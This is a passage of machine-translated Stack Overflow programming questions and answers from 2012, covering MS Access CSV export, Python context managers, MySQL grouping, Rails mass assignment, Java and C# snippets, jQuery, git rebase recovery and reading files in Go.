对于`Guid.Empty`or `11111111-1111-1111-1111-111111111111`，结果将是`1`。
对于`dc6a1ad8-4743-4487-a28e-54d31870dfcb`，结果是`16`。

您只需要决定要接受多大的数字才能接受`Guid`“正常”。

# mysql - 使用宏更改 MS Access CSV 导出字段分隔符 (Visual Basic)

> ID：13514130
> 
> 赞同：1
> 
> 时间：2012-11-22T13:49:24.907
> 
> 标签：mysql, ms-access, csv, export, delimiter

我有一个**访问数据库**，我正在尝试将所有表导出为**CSV 格式**，以便可以将它们导入 MySQL 数据库。

我**对 Visual Basic 的了解非常有限**，并且设法找到了一个宏模块（在网上），它可以让我一次导出所有表。

```
Public Sub exportAllChangeDelim()

Dim obj As AccessObject, dbs As Object

Set dbs = Application.CurrentData
    For Each obj In dbs.AllTables
        If Left(obj.Name, 4) <> "MSys" Then
            DoCmd.TransferText acExportDelim, , obj.Name, obj.Name & ".csv", false
        End If
    Next obj
End Sub 
```

有没有一种**简单的方法**可以更改默认字段分隔符，即：

"

例如自定义的东西：

{}

原因是我在尝试导出字段内的内容时遇到问题，因为它们有时包含语音标记，这会在导入 MySQL 时破坏字段计数。

为冗长的问题道歉！

# python - 如何将协调的元素写入给定的控制台？

> ID：13514131
> 
> 赞同：2
> 
> 时间：2012-11-22T13:49:40.107
> 
> 标签：python, linux, console, terminal, coords

给定下一个控制台：

```
import os
import tty
import termios
from sys import stdin

class Console(object):

    def __enter__(self):
        self.old_settings = termios.tcgetattr(stdin)
        self.buffer = []
        return self

    def __exit__(self, type, value, traceback):
        termios.tcsetattr(stdin, termios.TCSADRAIN, self.old_settings)

    ...

    def dimensions(self):
        dim = os.popen('stty size', 'r').read().split()
        return int(dim[1]), int(dim[0])

    def write(self, inp):
        if isinstance(inp, basestring):
            inp = inp.splitlines(False)
        if len(inp) == 0:
            self.buffer.append("")
        else:
            self.buffer.extend(inp)

    def printBuffer(self):
        self.clear()
        print "\n".join(self.buffer)
        self.buffer = [] 
```

现在我必须在该缓冲区中获取一些字母，但字母的顺序不正确，有些地方将是空的。例如：我想在屏幕的第 12 列和第 14 行有一个“w”，然后在其他地方有一些其他“w”，在那边有一个“b”等等......（控制台很大足以处理这个）。我怎么能实现这个？我真的不知道如何解决这个问题。

另一个困扰我的问题是如何调用这个exit-constructor，应该给出什么样的参数？

真诚的，一个真正缺乏经验的程序员。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:25:34.333

要回答您问题的第二部分...

`class Console`您应该使用该`with`语句调用。这将自动调用`__enter__`和`__exit__`例程。例如：

```
class CM(object):
    def __init__(self, arg):
         print 'Initializing arg .. with', arg
    def __enter__(self):
         print 'Entering CM'
    def __exit__(self, type, value, traceback):
         print 'Exiting CM'
         if type is IndexError:
             print 'Oh! .. an Index Error! .. must handle this'
             print 'Lets see what the exception args are ...', value.args
             return True 
```

运行它：

```
with CM(10) as x:
    print 'Within CM' 
```

输出：

```
Initializing arg .. with 10
Entering CM
Within CM
Exiting CM 
```

的参数`__exit__`与异常有关。如果退出 with 语句时没有异常，则所有参数（exception_type、exception_instance、exception_traceback）将为`None`. 这是一个显示如何使用**退出**参数的示例...

一个例外的例子：

```
with CM(10) as x:
    print 'Within CM'
    raise IndexError(1, 2, 'dang!') 
```

输出：

```
 Initializing arg .. with 10
 Entering CM
 Within CM
 Exiting CM
 Oh! .. an Index Error! .. must handle this
 Lets see what the exception args are ... (1, 2, 'dang!') 
```

在此处查看“With-Statement”和“上下文管理器”..

[http://docs.python.org/2/reference/compound_stmts.html#with](http://docs.python.org/2/reference/compound_stmts.html#with)

[http://docs.python.org/2/reference/datamodel.html#context-managers](http://docs.python.org/2/reference/datamodel.html#context-managers)

# php - MySQL SELECT 查询中的捆绑记录，存储为时间戳

> ID：13514142
> 
> 赞同：0
> 
> 时间：2012-11-22T13:50:20.623
> 
> 标签：php, mysql, sql, timestamp

不知道怎么问这个，但让我给你我的问题：

我有一个包含 50 000 条记录的表，在一列（名为recorded_at）中有一个时间戳。现在我想要一个 SQL SELECT 查询（用 PHP 处理），它会产生一个包含每天总数的数组。所以结果看起来像：

```
$array["2012-01-01"] = 4;
$array["2012-01-02"] = 14;
$array["2012-01-03"] = 45;
$array["2012-01-04"] = 33; 
```

等等...

我当然可以一年循环 365 天并选择 365 次，但这似乎效率很低。知道怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:03:26.053

试试这个：

```
SELECT DATE(FROM_UNIXTIME(recorded_at)), COUNT(*) totalCOunt
FROM tableName
GROUP BY DATE(FROM_UNIXTIME(recorded_at)) 
```

# ruby-on-rails - Rails 和 attr_accessible + 安全性

> ID：13514143
> 
> 赞同：0
> 
> 时间：2012-11-22T13:50:21.167
> 
> 标签：ruby-on-rails

我不确定我是否完全了解安全性和 attr_accessible。为什么任何属性被认为可以安全地进行批量分配？一件事是能够将 Admin 属性设置为 true 或类似的东西。但是，为什么让用户的电子邮件可访问被认为是安全的呢？难道不是，可能，同样糟糕吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T13:55:38.783

好吧，这是一场冗长的辩论，也许这个问题属于[https://security.stackexchange.com/](https://security.stackexchange.com/)但无论如何......

遵循的简单经验法则是：

任何您愿意直接从用户输入中接受并将其保存到数据库的参数都可以制作`attr_accessible`。

用户不应通过表单帖子更改的任何参数，例如电子邮件或 is_admin 等，都不应该。

如果您有需要有条件地验证或允许的属性，例如只有管理员可以设置某些东西，即使那样它们**也不**应该列在 attr_accessible 列表中。

# java - 从应用程序中包含的文件加载 android 数组

> ID：13514162
> 
> 赞同：1
> 
> 时间：2012-11-22T13:51:44.383
> 
> 标签：java, android, arrays, save

我一直在搜索，但不知道如何做到这一点。我正在创建一个基于块的游戏，比方说屏幕上的 3x3 块，每个块都有一个`int`关联以知道它是哪种类型：

```
int[][] blocksArray = {
    { 0, 0, 0 }
    { 0, 0, 1 }
    { 0, 0, 0 }
}; 
```

我基本上想做的是将50个像这样的多维数组保存到一个文件中，比如说“levels.txt”，就像这样：

```
int[][] level1 = {
    { 0, 0, 0 }
    { 0, 0, 1 }
    { 0, 0, 0 }
};
...
int[][] level50 = {
    { 0, 0, 0 }
    { 0, 0, 0 }
    { 0, 0, 0 }
}; 
```

这是解决问题的好方法吗？有没有更好的方法？

我真的不想制作我的数组字符串并将它们保存到共享首选项中，因为我需要手动编辑很多级别数组并且我想要这种格式，或者可能是一种非常相似的方式来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:16:26.460

您可以使用 java.io.ObjectOutputStream(); 将数组保存在文件中；

```
 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("file"));
    oos.writeObject(level1);
    ...
    oos.writeObject(level50); 
```

然后读回你的数组：

```
 ObjectInputStream ois = new ObjectInputStream(new FileInputStream("file"));
    level1 = (int[]][])ois.readObject();
    ...
    level50 = (int[]][])ois.readObject(); 
```

如果真的是你想要的

# jquery - 标题跳转到屏幕中间（JqueryMobile）

> ID：13514163
> 
> 赞同：0
> 
> 时间：2012-11-22T13:51:45.463
> 
> 标签：jquery, iphone, jquery-mobile

我正在使用 JQMobile 处理 .NET 应用程序我在页面上有一个固定的标题，我的问题是文本框的模糊操作标题跳转到屏幕中间。任何人都知道我该如何解决这个问题？

```
<div data-role="header" data-position="fixed">
    <h1>Fixed Header</h1>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T12:00:13.297

尝试添加`position: absolute`到标题然后将其编辑为`fixed`

# java - 使用面向字节的流（例如 FileInputStream/FileOutputStream）从/向文件读取/写入 int 值会访问缓冲区/磁盘 4 次吗？

> ID：13514168
> 
> 赞同：1
> 
> 时间：2012-11-22T13:51:55.503
> 
> 标签：java, io

示例代码是： -

```
import java.io.*;

public class WriteInt{
    public static void main(String [] args)
    {
    WriteInt obj = new WriteInt();
    obj.write();
    }

    public void write(){
    File file = null;
    FileOutputStream out = null;
    int [] arr = {6};
    try{
    file= new File("CheckSize.txt");
    out = new FileOutputStream(file);
    for(int i =0; i<arr.length;i++)
    {
        System.out.println("Trying to write to file:-"+ file);
        out.write(arr[i]);
    }

    }
    catch(IOException ioex){
    ioex.printStackTrace();
    } 
    finally{
    if(out != null)
    {
        System.out.println("Closing the stream");
        try{
        out.close();
        }   
        catch(IOException ioex){
        ioex.printStackTrace();
        }
    }

    else{
        System.out.println("Stream not open");
        }   
    }
    }

    } 
```

由于我使用面向字节的流将数据写入文件；我的问题是，数据是否会在每一步中分 4 步（1 个字节）写入文件。考虑`int`为4字节。如果我错了，请纠正我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T13:56:18.230

out.write(arr[i]) 将只写入 int 的最低字节。最好的解决方案是使用具有 writeInt(int) 方法的 java.io.DataOutputStream。

```
 DataOutputStream out = new DataOutputStream(new FileOutputStream("file"));
    out.writeInt(arr[i]); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T15:22:51.823

在您的示例中，您使用的是 OutputStream.write(int) ，它仅写入所提供数字的字节表示 - 仅写入一个字节，请查看[OutputStream API](http://docs.oracle.com/javase/6/docs/api/java/io/OutputStream.html)。因此，您的文件将仅包含一个 6 字节。如果您尝试写入一个大于 255 的数字 - 您可能会遇到异常。

基本上 OutputStream 要求其子类只实现 write(int) 方法，因此其他 OutputStream 方法将它们的字节发送到 write(int)。然而，FileOutputStream 中的所有写入方法都被覆盖，并利用可能尝试一次发送所有数据的缓冲本机调用。

# arduino - 带 USB HUB 的 Arduino Mega ADK

> ID：13514172
> 
> 赞同：0
> 
> 时间：2012-11-22T13:52:04.237
> 
> 标签：arduino, adk

android设备处于附件模式时是否可以查看数据？

```
in my opinion what we need 
1\. USB hub
2\. android phone(which work with accessory mode)
3\. Arduino Mega ADk
4\. USB cables first for android device and second for USB hub to PC

Connection
1.connect hub with Arduino ADK (where we have connect android device)
2.connect android device with hub(Via usb cable)
3.connect hub with PC(via usb cable) 
```

我所做的所有事情，但未检测到我的电脑 Android 设备

任何形式的建议将不胜感激提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:22:25.503

当您的 Android 设备连接到 Mega ADK 板时，它不会被检测到。原因是 PC 和 Mega ADK 都将充当 USB 主机，因此一次只能连接一个。

如果您想调试并想查看 logcat 的输出，那么您可以使用 ADB Wireless 应用程序。

# mysql - MYSQL 等效于 MS-Access 函数 first() last()

> ID：13514173
> 
> 赞同：0
> 
> 时间：2012-11-22T13:52:04.773
> 
> 标签：mysql, sql, sql-server, ms-access

为了更好地解释我需要什么，请查看下表：

```
ID --- image
A1 --- a1_01.jpg
A1 --- a1_02.jpg
B7 --- b7_01.jpg
B7 --- b7_02.jpg
D3 --- D3_04.jpg
D3 --- D3_99.jpg
... (From A to Z)
Z9 --- Z9_12.jpg
Z9 --- Z9_13.jpg
Z9 --- Z9_20.jpg
Z9 --- Z9_99.jpg
...and so on 
```

**我需要的结果是：**

```
ID --- Image
A1 --- a1_01.jpg
B7 --- b7_01.jpg
D3 --- D3_04.jpg
...
Z9 --- Z9_12.jpg
...and so on 
```

在 MS-Access 中，这可以通过`SELECT ID, First(image) AS 'Image' FROM Photos`

**我怎样才能在 MYSQL 中做到这一点？**

请记住，这是一个模型表，以说明我的问题。我有成吨成吨的记录。它不是一个（最小/最大）值！

**===编辑：2012 年 11 月 24 日===**
最终 SQL 代码：

```
SELECT ID, Min(image) AS 'Image' 
FROM Photos 
GROUP BY ID 
```

谢谢[@triclosan](https://stackoverflow.com/users/532208/triclosan)和[@iDevlop](https://stackoverflow.com/users/78522/idevlop)！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T13:58:55.750

如我所见

```
select ID, min(image)
from tbl
group by ID 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:01:29.307

```
SELECT ID, Min(image) AS 'Image' FROM mockup GROUP BY ID 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T18:13:50.403

如果第一个图像也是具有最小值的图像，并且最后一个图像也是具有最大值的图像，则此 MySql 查询将返回您想要的内容：

```
Select ID, min(image) as first_image, max(image) as last_image
From Tbl
Group By ID 
```

否则，由于 MySql 没有`first()`或`last()`聚合函数，你可以使用这样的东西：

```
Select
  Distinct ID,
  (select image from tbl a where a.ID = tbl.ID order by something ASC LIMIT 1) as first_image,
  (select image from tbl a where a.ID = tbl.ID order by something DESC LIMIT 1) as last_image,
From tbl 
```

但请注意，您必须按某个字段对表格进行排序。如果您无法按某个字段对表格进行排序，则无法区分哪个值在前，哪个值在后。

我经常看到这个查询，看起来不错，应该返回第一个字段：

```
Select ID, image
From tbl
Group by ID 
```

这是一个非标准的 Sql 查询，通常有效并且（几乎？）总是正确返回第一张图像。但是由于`image`不在`group by`子句中并且不与任何聚合函数相关联，服务器可以自由地返回任何值。它似乎总是返回第一个值，但不能保证，我不想使用它。

**一些解释：**

在您的示例中，最小值始终与第一个一致，因此无法从您的示例中判断您是在寻找最小值还是在寻找第一个。

假设这是您的数据：

```
ID  image
=============
A1  a1_02.jpg
A1  a1_01.jpg 
```

如果您正在寻找最小值 ( `A1, a1_01.jpg`)，`min(image)`这正是您所需要的，它会起作用！

但是如果你想得到`A1, a1_02.jpg`，在这个例子中是第一个......那么我们就有问题了。如果没有特定的 ORDER BY，行将以不可预测的方式返回。是的，它们经常/几乎总是按照它们在表空间中的物理顺序返回，但我们不能依赖这一点。

例如看这个问题和答案：

[处理默认排序顺序的 SQL 最佳实践](https://stackoverflow.com/questions/1793147/sql-best-practice-to-deal-with-default-sort-order)

这意味着如果我们不知道行是如何排序的，我们就无法分辨哪个是第一个，哪个是最后一个。例如，请参阅此查询：

```
Select
  Distinct ID,
 (select image from tbl a where a.ID = tbl.ID LIMIT 1) as first_image
From tbl 
```

这可能会返回您正在寻找的内容。但由于我省略了 ORDER BY 子句，因此不能保证它总是有效。请注意，我还必须删除 last_image，因为没有办法告诉 MySql 按默认顺序 DESC 对表进行排序，因为这样的默认顺序不存在。

此查询可能还会返回第一张图片：

```
Select ID, image
From tbl
Group By ID 
```

在标准 SQL 中，我们不能在 select 中引用非聚合列，但在 MySql 中是可能的。它可能会返回每个 ID 的第一张图片。但是让我们看看文档：

[http://dev.mysql.com/doc/refman/5.0/en/group-by-extensions.html](http://dev.mysql.com/doc/refman/5.0/en/group-by-extensions.html)

"The server is free to choose any value from each group, so unless they are the same, the values chosen are indeterminate." So the fact that the server almost always returns the first row is just coincidence, and it's not documented.

# lucene - 查找两个文档 Lucene 之间的相似性

> ID：13514175
> 
> 赞同：3
> 
> 时间：2012-11-22T13:52:18.700
> 
> 标签：lucene, similarity, documents

我已经索引了 400 个文档。然后我想给两个文档和 lucene 来返回这两个文档之间的相似性。那可能吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T14:22:52.780

简单来说。计算两个文档向量的余弦。

[示例代码](http://sujitpal.blogspot.com/2011/10/computing-document-similarity-using.html)

# c# - 为什么 var Int32 不是 List 在这个例子中

> ID：13514176
> 
> 赞同：2
> 
> 时间：2012-11-22T13:52:25.863
> 
> 标签：c#, linq

好的，我正在寻找另一个 SO 问题的答案，我想出了以下函数来获得一个不同的 int 列表：

```
 static List<Int32> Example(params List<Int32> lsts)
    {
        List<Int32> result = new List<int>();

        foreach (var lst in lsts)
        {
            result = result.Concat(lst).ToList();
        }

        return result.Distinct().OrderBy(c => c).ToList();
    } 
```

当我`var`在 VS2012 中查看时，它说它的类型为`Int32`not `List<Int32>`。此处显示：

![问题](../Images/01435e7d1a519a3fcbf86399431f413f.png)

var 不应该是 type`List<Int32>`吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-22T13:55:06.043

您`[]`在参数类型声明的末尾缺少 a ：

```
//                                            v-- this is missing in your code
static List<Int32> Example(params List<Int32>[] lsts)
{
    List<Int32> result = new List<int>();

    foreach (var lst in lsts)
    {
        result = result.Concat(lst).ToList();
    }

    return result.Distinct().OrderBy(c => c).ToList();
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-22T13:53:54.100

您被另一个编译器错误误导了。
您的参数不是数组。

您需要更改参数以`params List<Int32>[] lsts`使其成为列表数组。（或者，更好的是，`params IEnumerable<Int32>[] lsts`）

请注意，您也可以完全摆脱`foreach`循环并编写

```
return lsts.SelectMany(list => list)
           .Distinct()
           .OrderBy(i => i)
           .ToList(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T13:57:34.257

带关键字的参数`params`必须是数组。

# java - SSLException - 轴连接在大请求时关闭

> ID：13514179
> 
> 赞同：3
> 
> 时间：2012-11-22T13:52:35.813
> 
> 标签：java, ssl, axis

从本周开始，我无法从 Axis 1.4 Web 服务获得大量响应。我的 Web 服务客户端在这周之前可以正常工作。但是现在，当我使用存根发出一个大请求时，它以“连接已关闭 [...] 连接由对等方重置：套接字写入错误”结束。

然后我开始使用相同的存根方法发送较小的请求，并且工作正常......我尝试向我的存根“stub.setTimeout(10000)”添加超时，但它没有用。当我创建 SSL 证书时，我还设置了一个超时，例如：

```
SSLSocket socket = (SSLSocket)factory.createSocket(host, port);
socket.setSoTimeout(10000); 
```

也没有工作...

这是完整错误堆栈跟踪的第一部分...

```
AxisFault
faultCode: {http://schemas.xmlsoap.org/soap/envelope/}Server.userException
faultSubcode: 
faultString: javax.net.ssl.SSLException: Connection has been shutdown:    javax.net.ssl.SSLException: java.net.SocketException: Connection reset by peer: socket    write error
faultActor: 
faultNode: 
faultDetail: 
{http://xml.apache.org/axis/}stackTrace:javax.net.ssl.SSLException: Connection has been shutdown: javax.net.ssl.SSLException: java.net.SocketException: Connection reset by peer: socket write error
at com.sun.net.ssl.internal.ssl.SSLSocketImpl.checkEOF(Unknown Source)
at com.sun.net.ssl.internal.ssl.AppInputStream.read(Unknown Source)
at java.io.BufferedInputStream.fill(Unknown Source)
at java.io.BufferedInputStream.read(Unknown Source)
at org.apache.axis.transport.http.HTTPSender.readHeadersFromSocket(HTTPSender.java:583)
at org.apache.axis.transport.http.HTTPSender.invoke(HTTPSender.java:143)
at org.apache.axis.strategies.InvocationStrategy.visit(InvocationStrategy.java:32)
at org.apache.axis.SimpleChain.doVisiting(SimpleChain.java:118)
at org.apache.axis.SimpleChain.invoke(SimpleChain.java:83)
at org.apache.axis.client.AxisClient.invoke(AxisClient.java:165)
at org.apache.axis.client.Call.invokeEngine(Call.java:2784)
at org.apache.axis.client.Call.invoke(Call.java:2767)
at org.apache.axis.client.Call.invoke(Call.java:2443)
at org.apache.axis.client.Call.invoke(Call.java:2366)
at org.apache.axis.client.Call.invoke(Call.java:1812)
at ca.gc.shc.ws.SpineSoapBindingStub.interpolate(SpineSoapBindingStub.java:582)
at    ca.ogsl.ocean.clientsBridge.SpineClientAdaptor.interpolateAll(SpineClientAdaptor.java:220)
at ca.ogsl.ocean.clientsBridge.SpineRunnable.run(SpineRunnable.java:30)
at java.util.concurrent.Executors$RunnableAdapter.call(Unknown Source)
at java.util.concurrent.FutureTask$Sync.innerRun(Unknown Source)
at java.util.concurrent.FutureTask.run(Unknown Source)
at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
at java.lang.Thread.run(Unknown Source)

Caused by: javax.net.ssl.SSLException: java.net.SocketException: Connection reset by peer: socket write error
at com.sun.net.ssl.internal.ssl.Alerts.getSSLException(Unknown Source)
at com.sun.net.ssl.internal.ssl.SSLSocketImpl.fatal(Unknown Source)
at com.sun.net.ssl.internal.ssl.SSLSocketImpl.fatal(Unknown Source)
at com.sun.net.ssl.internal.ssl.SSLSocketImpl.handleException(Unknown Source)
at com.sun.net.ssl.internal.ssl.SSLSocketImpl.handleException(Unknown Source)
at com.sun.net.ssl.internal.ssl.AppOutputStream.write(Unknown Source)
at java.io.BufferedOutputStream.write(Unknown Source)
at org.apache.axis.utils.ByteArray.writeTo(ByteArray.java:375)
at org.apache.axis.SOAPPart.writeTo(SOAPPart.java:265)
at org.apache.axis.Message.writeTo(Message.java:539)
at org.apache.axis.transport.http.HTTPSender.writeToSocket(HTTPSender.java:511)
at org.apache.axis.transport.http.HTTPSender.invoke(HTTPSender.java:138)
... 18 more

Caused by: java.net.SocketException: Connection reset by peer: socket write error
at java.net.SocketOutputStream.socketWrite0(Native Method)
at java.net.SocketOutputStream.socketWrite(Unknown Source)
at java.net.SocketOutputStream.write(Unknown Source)
at com.sun.net.ssl.internal.ssl.OutputRecord.writeBuffer(Unknown Source)
at com.sun.net.ssl.internal.ssl.OutputRecord.write(Unknown Source)
at com.sun.net.ssl.internal.ssl.SSLSocketImpl.writeRecordInternal(Unknown Source)
at com.sun.net.ssl.internal.ssl.SSLSocketImpl.writeRecord(Unknown Source)
... 25 more 
```

有人有线索或知道我该如何解决这个问题吗？

哦......我正在使用：Eclipse - Tomcat 6 - Java 6 - Axis 1.4

非常感谢您花时间回答！！！

# javascript - 在 JavaScript 中读取外部 JSON 文件以填充选择下拉列表

> ID：13514180
> 
> 赞同：2
> 
> 时间：2012-11-22T13:52:37.290
> 
> 标签：javascript, jquery, json, xhtml

我想寻求一些帮助。我有一个外部 JSON 文件，里面有一个数组，如下所示：

```
{ "Files": [
    {
        "fileName": "Trains",
        "fileID": "t1"
    },
    {
        "fileName": "Planes",
        "fileID": "p1"
    },
    {
        "fileName": "Cars",
        "fileID": "c1"
    }
]} 
```

我试图最终使用这些数据来填充 XHTML 页面中的下拉选择菜单，同时使用 JavaScript 来编写它。到目前为止，我已经获得了以下信息，但现在无法弄清楚我在最后一道障碍中哪里出错了。对我不理解的任何指示表示赞赏，谢谢。

```
function fileDropdown() {
    var options = "";
    $.getJSON(
        "json/files.json", 
        function(result) {
            //find the array and do seomthing
            $.each(result.Files, function(key, val) {
                options += '<option value="' + val.fileID + '">' + val.fileName + '</option>';
            });
        }
    );
    document.write("<select>"+options+"</select>");
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T13:56:40.240

试试这个：

```
function fileDropdown()
{

$.getJSON("json/files.json", function(result) {
//find the array and do seomthing
    var options = "";
    $.each(result.Files, function(key, val) {
        options += '<option value="' + val.fileID + '">' + val.fileName + '</option>';
    });
    var select = $('<select/>');
    select.append(options);
    $(document.body).append(select);
});
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T22:37:43.523

谢谢，现在解决了这个问题。会支持你，但需要更多的声誉。

我用了

```
$.each(result.Files, function(file) {
        selectElement.append($('<option value="' + this.fileID + '">' + this.fileName + '</option>')); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T13:56:15.100

`$.getJSON("json/files.json", ...)`表示“获取`window.location`、附加`json/files.json`然后使用此 URL 发送 GET 请求”。

要解决此问题，您可以使用绝对`file:`URL。但是出于安全原因，您的浏览器可能会拒绝加载文件。

另一种方法是让您的 Web 服务器在请求上述 URL 时将文件发送到浏览器。

# git - Git - 如何恢复已推送到远程分支（不是原点）的变基

> ID：13514182
> 
> 赞同：14
> 
> 时间：2012-11-22T13:52:40.190
> 
> 标签：git, git-rebase

我正在本地分支上进行一些更改，完成后我将所有内容推送到远程分支。在将分支与开发合并之前，我认为我应该做一个变基，因为其他人在那里合并了很多他们的代码。当我进行变基并解决了一些冲突时，我推送到了远程分支。不幸的是，我解决冲突的方式是错误的，所以现在我需要在变基发生之前返回，并将远程分支更新到新状态。

**我试过的**

1.  重置头部

    git reset --hard HEAD@{x} //x 是变基之前的头部

这可以工作并恢复我的本地分支上的更改，但是我不知道要使远程分支更新到那个位置，因为它不会创建可以推送到远程的新提交。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-22T14:23:48.080

您不应该重写远程存储库的历史记录，因为如果

1.  你推的东西坏了
2.  有人拉
3.  你强行推动不同的历史

您不仅会遇到必须修复混乱的问题，还会遇到其他所有撤消更改的问题。因此，除非您可以确定没有人拉它，*否则不要执行 force-push*。

相反，您应该使用以下任一方式恢复提交

```
>> git revert HEAD@{y}   # where HEAD@{y} is the faulty commit 
```

如果只有一个提交是混乱的，在合并的情况下。

如果 rebase 将多个提交转移到主分支上，您需要做

```
>> git revert --no-commit HEAD
>> git revert --no-commit HEAD~1
>> git revert --no-commit HEAD~2
   ...
>> git revert --no-commit HEAD@{x}
>> git commit -m "Sorry folks for the big mess I made" 
```

所有的`HEAD~y`都是介于`HEAD@{x}`和之间的提交`HEAD`。

这将在一个大提交中有效地撤消所有受影响的提交。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2022-01-06T11:44:14.547

**不要恐慌！只需在终端中按照这些步骤操作**

```
git reflog 
```

或者

```
git log -g 
```

这将在终端中显示以前的提交，例如

[![在此处输入图像描述](../Images/053d433401f66cf9348008ab7abe7bc7.png)](https://i.stack.imgur.com/KqC5P.png)

这里的提交被命名为 HEAD@{0}、HEAD@{1} 等等

```
git revert HEAD@{5} 
```

完成。现在您可以像提交之前一样看到所有文件

# asp.net - 在 asp.net 中模拟 wcf 客户端

> ID：13514183
> 
> 赞同：0
> 
> 时间：2012-11-22T13:52:45.703
> 
> 标签：asp.net, wcf

假设我们有一个合同

```
public interface IService
{
    System.String DoSomethingUseful();
} 
```

并且需要从 .aspx 页面调用客户端

```
var client = new ServiceClient();
var result = client.DoSomethingUseful(); 
```

问题是只有特殊用户才能对“DoSomethingUseful”中的某些操作拥有权限，我必须用身份模拟池：

```
<identity impersonate="true" userName="domain\SecretUser" password="secretPass" /> 
```

否则我会在方法调用时得到“拒绝访问”异常。

除了模拟池之外，还有另一种模拟 wcf 客户端的方法，也许在绑定中的某个地方？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T18:27:11.950

我会看看设置`ClientCredentials`- 见 [http://msdn.microsoft.com/en-us/library/ms553830.aspx](http://msdn.microsoft.com/en-us/library/ms553830.aspx)

# string - 如何将整个文件读入字符串变量

> ID：13514184
> 
> 赞同：229
> 
> 时间：2012-11-22T13:52:46.393
> 
> 标签：string, file, go

我有很多小文件，我不想逐行阅读它们。

Go中有一个函数可以将整个文件读入字符串变量吗？

* * *

## 回答 #1

> 赞同：328
> 
> 时间：2012-11-22T14:04:39.447

使用[`ioutil.ReadFile`](http://golang.org/pkg/io/ioutil/#ReadFile)：

```
func ReadFile(filename string) ([]byte, error) 
```

> ReadFile 读取由 filename 命名的文件并返回内容。成功的调用返回 err == nil，而不是 err == EOF。因为 ReadFile 读取整个文件，所以它不会将 Read 中的 EOF 视为要报告的错误。

您将得到 a`[]byte`而不是 a `string`。*如果确实*需要，可以转换：

```
s := string(buf) 
```

* * *

## 回答 #2

> 赞同：88
> 
> 时间：2016-08-07T05:41:02.130

如果您只想要内容为`string`，那么简单的解决方案是使用包中的`ReadFile`功能`io/ioutil`。此函数返回一个切片`bytes`，您可以轻松地将其转换为`string`.

```
package main

import (
    "fmt"
    "io/ioutil"
)

func main() {
    b, err := ioutil.ReadFile("file.txt") // just pass the file name
    if err != nil {
        fmt.Print(err)
    }

    fmt.Println(b) // print the content as 'bytes'

    str := string(b) // convert content to a 'string'

    fmt.Println(str) // print the content as a 'string'
} 
```

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2012-11-22T15:09:51.613

如果您真的关心连接所有这些文件的效率，我认为最好的办法是将它们全部复制到相同的字节缓冲区中。

```
buf := bytes.NewBuffer(nil)
for _, filename := range filenames {
  f, _ := os.Open(filename) // Error handling elided for brevity.
  io.Copy(buf, f)           // Error handling elided for brevity.
  f.Close()
}
s := string(buf.Bytes()) 
```

这会打开每个文件，将其内容复制到 buf，然后关闭文件。根据您的情况，您实际上可能不需要转换它，最后一行只是显示 buf.Bytes() 具有您要查找的数据。

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2017-04-17T10:48:57.590

我是这样做的：

```
package main

import (
  "fmt"
  "os"
  "bytes"
  "log"
)

func main() {
   filerc, err := os.Open("filename")
   if err != nil{
     log.Fatal(err)
   }
   defer filerc.Close()

   buf := new(bytes.Buffer)
   buf.ReadFrom(filerc)
   contents := buf.String()

   fmt.Print(contents) 

} 
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2021-03-25T17:20:28.483

您可以使用[strings.Builder](//godocs.io/strings#Builder)：

```
package main

import (
   "io"
   "os"
   "strings"
)

func main() {
   f, err := os.Open("file.txt")
   if err != nil {
      panic(err)
   }
   defer f.Close()
   b := new(strings.Builder)
   io.Copy(b, f)
   print(b.String())
} 
```

或者，如果您不介意`[]byte`，可以使用 [os.ReadFile](//godocs.io/os#ReadFile)：

```
package main
import "os"

func main() {
   b, err := os.ReadFile("file.txt")
   if err != nil {
      panic(err)
   }
   os.Stdout.Write(b)
} 
```

* * *

## 回答 #6

> 赞同：-5
> 
> 时间：2019-02-01T07:40:59.127

我不会用电脑，所以我写了一个草稿。你可能对我说的很清楚。

```
func main(){
    const dir = "/etc/"
    filesInfo, e := ioutil.ReadDir(dir)
    var fileNames = make([]string, 0, 10)
    for i,v:=range filesInfo{
        if !v.IsDir() {
            fileNames = append(fileNames, v.Name())
        }
    }

    var fileNumber = len(fileNames)
    var contents = make([]string, fileNumber, 10)
    wg := sync.WaitGroup{}
    wg.Add(fileNumber)

    for i,_:=range content {
        go func(i int){
            defer wg.Done()
            buf,e := ioutil.Readfile(fmt.Printf("%s/%s", dir, fileName[i]))
            defer file.Close()  
            content[i] = string(buf)
        }(i)   
    }
    wg.Wait()
} 
```

# html - 在 Jquery mobile 中为每个屏幕单独的 html 页面

> ID：13514186
> 
> 赞同：0
> 
> 时间：2012-11-22T13:52:47.587
> 
> 标签：html, jquery, jquery-mobile, jquery-plugins

